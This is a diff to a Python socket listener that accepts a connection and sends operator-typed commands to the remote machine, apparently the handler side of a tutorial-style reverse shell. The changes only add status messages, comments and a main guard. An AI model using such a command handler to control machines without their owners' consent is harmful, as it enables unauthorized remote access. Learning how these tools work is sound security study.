@@ -35,9 +35,11 @@ def socket_bind():
         global host
         global port
         global s
-        host = '0.0.0.0'  # localhost
+        host = '0.0.0.0'  # changed to prevent null being passed through
         print("Binding socket to port: " + str(port))
-        s.bind((host, port))  # host: usually an IP address, but since we listening to our own machine, it is blank
+        s.bind((host, port))
+        # host: usually an IP address, but since we listening to our own machine, it is blank
+        # edit: now changed to 0.0.0.0 manually
         s.listen(5)
         # listen 5 is number of bad connections it will take before refusing
     except socket.error as msg:
@@ -49,6 +51,7 @@ def socket_bind():
 def socket_accept():
     conn, address = s.accept()
     print("Connection has been established | IP " + address[0] + " | Port " + str(address[1]))
+    print("[+] Type 'quit' at any time to close connection.")
     send_commands(conn)
     conn.close()
 
@@ -61,8 +64,10 @@ def send_commands(conn):
         # whenever we want to send across network, need to be of byte type
         # to print out for user, need to be changed to string
         if cmd == 'quit':
+            print("[+] Closing the connection...")
             conn.close()
             s.close()
+            print("[+] Connection closed. Goodbye.")
             sys.exit()
         if len(str.encode(cmd)) > 0:  # check that the command is not empty, otherwise do not send across network
             conn.send(str.encode(cmd))
@@ -76,4 +81,6 @@ def main():
     socket_accept()
 
 
-main()
+if __name__ == '__main__':
+    # call the main function
+    main()
